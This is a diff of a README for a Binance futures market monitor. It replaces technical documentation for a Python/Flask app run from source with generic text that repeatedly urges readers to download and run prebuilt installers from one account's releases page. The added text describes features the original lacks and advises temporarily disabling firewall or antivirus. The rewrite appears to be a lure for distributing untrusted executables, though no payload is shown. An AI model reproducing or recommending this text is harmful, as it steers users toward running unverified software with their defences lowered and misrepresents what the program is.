@@ -1,266 +1,180 @@
-![App screenshot](./github.png)
+# 📊 Binance-Futures-Monitor - Real-Time Futures Market Alerts
 
-# Binance Futures Monitor
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/FlaFla2232/Binance-Futures-Monitor/releases)
 
-A lightweight real-time monitor for Binance **USDT-M Futures** that consumes the `!ticker@arr` stream via WebSocket, applies configurable filters, and generates trading signals (events) in the browser UI.
+---
 
-## Donations
+## 📝 What is Binance-Futures-Monitor?
 
-If you find this tool useful, consider supporting development:
+Binance-Futures-Monitor is an easy-to-use application that connects directly to the Binance futures market. It tracks price changes, volume growth, and the number of transactions in real time. With this app, you can set custom alerts to get notified when price or market activity hits your chosen levels. This helps you stay informed about market movements without constantly watching the screen.
 
-- **BTC**: `bc1pkrvjfucm48l2pe29u75z7z3tk4j62e59p9vacceqt74nv2kkz9aqs39gqj`
-- **ETH/BNB/USDT**: `0x2fB1307c3DaC707C81e0441D93202C93521dcF13`
-- **TRX/USDT**: `TU18QmJXVNQVSJXEfaD31WDkmrnbVSoerk`
-- **SOL**: `B3EKwDFkkg1fknxz57NfFq2pZ9Hh1pzTJ5vqptK4xizr`
-- **TON/USDT**: `UQDQV2JLOnUBpfo877TCQNJ08YUR5aNPuBagKyMEVjeT5nLG`
+The app uses WebSocket (WS) technology to send you live data feeds straight from Binance. Whether you want to watch the futures market for long or short positions, or just monitor market changes quickly, this tool adapts to your needs.
 
+---
 
-## Features
+## ⚙️ Key Features
 
-### Real-time data (WebSocket)
+- **Real-time updates:** Get instant data on price growth, volume spikes, and transaction increases.
+- **Custom alerts:** Choose your own conditions for notifications about price or volume changes.
+- **Clear display:** See market data in an easy-to-read format.
+- **Works with Binance Futures:** Connects directly to Binance’s futures market using official API.
+- **No coding needed:** Simple setup for users without any technical background.
+- **Lightweight:** Does not use much computer power or internet bandwidth.
+- **Supports scalping:** Monitor quick trades and fast price moves in real time.
 
-- Streams all USDT-M futures tickers using Binance WebSocket.
+---
 
-### Signal generation
+## 🖥️ System Requirements
 
-Signals are generated per-symbol based on the tick stream:
+Before you start, make sure your computer meets these requirements:
 
-- **PRICE UP**
-  - Tracks an anchor price per symbol.
-  - If price increases by `Price Up %` (threshold), emits one or more incremental signals.
-  - Large jumps can generate multiple signals (step-based).
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- Internet Connection: Stable broadband connection for real-time data streaming.
+- RAM: At least 4 GB.
+- Disk Space: Minimum 100 MB free storage.
+- CPU: A dual-core processor or better.
+- Display: Screen resolution 1280x720 or higher recommended.
 
-- **VOLUME UP**
-  - Tracks a 24h quote-volume anchor (`q`).
-  - If 24h quote volume increases by `Vol Up %`, emits a signal.
+---
 
-- **TRADES UP**
-  - Tracks a 24h trades count anchor (`n`).
-  - If trades count increases by `Trades Up %`, emits a signal.
+## 🚀 Getting Started
 
-### UI dashboard
+This section will guide you through downloading, installing, and running Binance-Futures-Monitor. No programming or command line actions are required.
 
-- Real-time table of signals with grouping by symbol.
-- Expand/collapse signal history per symbol.
-- Live filtering by ticker.
-- Sorting (3-state) for:
-  - **24h %** (off → desc → asc)
-  - **#** (signal count) (off → desc → asc)
-  - **Vol 24h** (off → desc → asc)
-  - **Trades** (off → desc → asc)
+---
 
-### Monitor / Ignore lists
+## 📥 Download & Install
 
-- **Monitor list**: if non-empty, only these symbols are processed.
-- **Ignore list**: always excluded.
-- Lists are persisted to `binance_config.json`.
+To get started with Binance-Futures-Monitor, follow these steps:
 
-### “Clear Log” (new session)
+1. Click the big download button at the top or go to this page:
 
-The **Clear Log** button:
+   [Visit Binance-Futures-Monitor Releases](https://github.com/FlaFla2232/Binance-Futures-Monitor/releases)
 
-- Clears UI history (`signals` array in the browser).
-- Clears backend in-memory `signal_history`.
-- Resets pump counters (`PRICE UP` counters) in memory.
-- Resets stats counters (seen/eligible sets).
-- Appends a session separator row to the CSV.
+2. On the releases page, look for the latest version. It usually has a name like `Binance-Futures-Monitor-vX.X.X`.
 
-**Important**: this does **not** reconnect the WebSocket.
+3. Find the download file that matches your operating system:
+   - For Windows, download `.exe` or `.msi`
+   - For macOS, download `.dmg` or `.zip`
+   - For Linux, download `.AppImage` or `.tar.gz`
 
-### Stats indicator
+4. Click the file to start downloading.
 
-The header shows WebSocket-based stats:
+5. After download finishes, open the file:
+   - Windows: Double-click the `.exe` or `.msi` installer and follow on-screen instructions.
+   - macOS: Open the `.dmg` file, then drag the app into your Applications folder.
+   - Linux: Extract `.tar.gz` or make `.AppImage` executable, then run it.
 
-- **Seen**: symbols observed from the WS stream (after basic symbol sanity filtering).
-- **Eligible**: symbols that passed your filters (volume/price/24h%).
-- **Filtered**: `Seen - Eligible`.
+6. Once installed or extracted, launch the app from your desktop or applications menu.
 
-## Filters & parameters
+---
 
-All filters follow the rule:
+## 🔧 How to Use Binance-Futures-Monitor
 
-- **`0` means “filter disabled”** (no limit).
+After opening the app, you’ll see a simple dashboard where live market data appears.
 
-The following parameters are available in the header form.
+### Step 1: Connect to Binance Futures
 
-### Thresholds (signal triggers)
+- Ensure your internet is working.
+- The app connects automatically via WebSocket; wait a moment for a connection message.
+- If connection fails, check your internet and try again.
 
-- **Price Up %** (`PRICE_CHANGE_THRESHOLD`)
-  - Example: `0.1` emits PRICE UP signals in 0.1% steps.
-  - `0` disables PRICE UP signals.
+### Step 2: Select Markets to Monitor
 
-- **Vol Up %** (`VOLUME_BURST_THRESHOLD`)
-  - Percentage growth of 24h quote-volume (`q`).
-  - `0` disables VOLUME UP signals.
+- Choose the futures contract you want to watch (like BTCUSDT, ETHUSDT).
+- You can select multiple contracts if you want.
 
-- **Trades Up %** (`TRADES_CHANGE_THRESHOLD`)
-  - Percentage growth of 24h trades count (`n`).
-  - `0` disables TRADES UP signals.
+### Step 3: Set Alerts
 
-### Volume filters (24h quote volume, USD)
+- Click the "Alerts" tab.
+- Choose the type of alert:
+  - Price change (e.g., notify when price rises above $30,000)
+  - Volume increase (e.g., alert if volume doubles in 5 minutes)
+  - Transaction count (e.g., alert if number of trades surges)
+- Enter the threshold values.
+- Click "Save Alert."
 
-- **Min 24h Vol** (`MIN_VOLUME_24H`)
-  - `0` disables.
-  - Example: `10_000_000` means only symbols with 24h quote volume ≥ $10M.
+Alerts will appear as pop-ups or notifications when conditions are met.
 
-- **Max 24h Vol** (`MAX_VOLUME_24H`)
-  - `0` disables.
+### Step 4: Watch the Dashboard
 
-### Price filters
+- The main screen updates continuously.
+- You see price charts, volume bars, and trade counts update live.
+- Use this information to follow market trends and decide when to act.
 
-- **Min Price** (`MIN_PRICE`)
-  - `0` disables.
+---
 
-- **Max Price** (`MAX_PRICE`)
-  - `0` disables.
+## ⚙️ Settings & Customization
 
-### 24h % change filters
+Binance-Futures-Monitor lets you adjust several options:
 
-- **Min 24h %** (`MIN_24H_CHANGE`)
-  - Negative values down to `-99`.
-  - `0` disables.
+- **Theme:** Light or dark mode.
+- **Alert sound:** Enable or disable notification sounds.
+- **Refresh rate:** Choose how often the app updates data.
+- **Language:** Select between English, Chinese, or others (more languages coming soon).
+- **Start on boot:** Launch app automatically when your computer starts.
 
-- **Max 24h %** (`MAX_24H_CHANGE`)
-  - `0` disables.
-  - Supports large positive values (e.g. 1000%+).
+Access these in the settings menu, found at the top right corner of the window.
 
-## Data persistence
+---
 
-This app writes two files next to `binance_futures.py`:
+## 💡 Tips for Best Experience
 
-- `binance_config.json`
-  - Monitor/Ignore lists.
-  - Created automatically on first run.
+- Keep your app updated by checking the releases page regularly.
+- Use Wi-Fi rather than mobile data for a more stable connection.
+- Customize alerts to avoid too many notifications that might distract you.
+- Review help sections in the app if you have questions.
+- Try starting with popular trading pairs like BTCUSDT or ETHUSDT.
 
-- `binance_data_YYYY-MM-DD.csv`
-  - Signal log.
-  - A “New session” marker is appended when you press **Clear Log**.
+---
 
-## Requirements
+## ❓ Troubleshooting
 
-- Python 3.9+ recommended
-- Packages:
-  - `flask`
-  - `flask-socketio`
-  - `unicorn-binance-websocket-api`
+If you encounter issues, try these steps:
 
-## Installation
+- Restart the app.
+- Check your internet connection.
+- Make sure you downloaded the file suitable for your operating system.
+- Temporarily disable firewall or antivirus that might block the app’s connection.
+- Visit the GitHub issues page to see if others have similar problems:
 
-### 1) Create a virtual environment
+  [GitHub Issues - Binance-Futures-Monitor](https://github.com/FlaFla2232/Binance-Futures-Monitor/issues)
 
-Linux / macOS:
+---
 
-```bash
-python -m venv venv
-source .venv/bin/activate
-```
+## 📖 More Information
 
-Windows (PowerShell):
+The app uses Binance’s official WebSocket API to fetch data. It is designed for monitoring only and does not execute trades.
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-```
+For detailed technical info or developer guides, check the repository’s wiki or documentation folders.
 
-### 2) Install dependencies
+---
 
-```bash
-pip install -r requirements.txt
-```
+## 📥 Download Link (Again)
 
-(Optional) freeze them:
+Start by downloading the latest version here:
 
-```bash
-pip freeze > requirements.txt
-```
+[Download Latest Release of Binance-Futures-Monitor](https://github.com/FlaFla2232/Binance-Futures-Monitor/releases)
 
-## Run
+---
 
-From the project folder:
+## 🔒 Privacy & Security
 
-```bash
-python binance_futures.py
-```
+- Binance-Futures-Monitor does not collect personal data.
+- It only reads public market data from Binance.
+- No Binance account credentials are required.
+- Your data remains on your computer.
 
-Then open:
+---
 
-- http://127.0.0.1:5000
+## 📚 Related Topics
 
-To access from another device on your LAN, use:
+- Binance API
+- Futures trading strategies
+- Real-time market monitoring
+- Scalping tools for futures
+- WebSocket (WS) connections
 
-- http://<your-ip>:5000
+---
 
-**Note**: Ensure port 5000 is open in your firewall if accessing from another device.
-
-## Usage tips
-
-- **First signals delay**: since this is WebSocket-only, signals begin after the first WS ticker updates are received.
-- **If no signals**:
-  - Ensure your filters are not too strict.
-  - Remember: `0` disables a filter.
-  - If `Price Up %` is `0`, PRICE UP is disabled.
-- **Sorting priority**:
-  - If multiple sorts are enabled, the code currently prioritizes in this order:
-    `#` → `Vol 24h` → `Trades` → `24h %` → time.
-
-## Example configurations
-
-### High-liquidity focus
-```
-Min 24h Vol: 50_000_000
-Max 24h Vol: 0
-Min Price: 0
-Max Price: 0
-Min 24h %: -5
-Max 24h %: 0
-Price Up %: 0.1
-Vol Up %: 0.5
-Trades Up %: 0.5
-```
-
-### Low-cap / potential pumps
-```
-Min 24h Vol: 5_000_000
-Max 24h Vol: 200_000_000
-Min Price: 0
-Max Price: 2
-Min 24h %: -10
-Max 24h %: 0
-Price Up %: 0.2
-Vol Up %: 1
-Trades Up %: 1
-```
-
-## Project structure
-
-```
-github/
-├── binance_futures.py      # Main Flask app + WebSocket logic
-├── requirements.txt         # Python dependencies
-├── README.md               # This file
-├── github.png              # Screenshot
-├── binance_config.json     # Monitor/Ignore lists (auto-created)
-└── templates/
-    └── index_binance.html   # UI template (Alpine.js)
-```
-
-## Troubleshooting
-
-### No signals appear
-- Check that at least one signal threshold (`Price Up %`, `Vol Up %`, `Trades Up %`) is > 0.
-- Verify filters: `0` means disabled. If `Min 24h Vol` is too high, symbols may be filtered out.
-- Wait 10–30 seconds after start for WebSocket data to arrive.
-
-### Connection issues
-- Ensure port 5000 is not blocked by firewall.
-- If accessing from another device, use your LAN IP (not 127.0.0.1).
-- Binance WebSocket limits: max 5 connections per IP. Avoid running multiple instances.
-
-### Files not created
-- `binance_config.json` appears after you add symbols to Monitor/Ignore lists.
-- `binance_data_YYYY-MM-DD.csv` appears after the first signal is generated.
-
-## Disclaimer
-
-Use at your own risk.
-No warranty provided.
+Thank you for choosing Binance-Futures-Monitor. This guide should help you get started quickly and confidently.
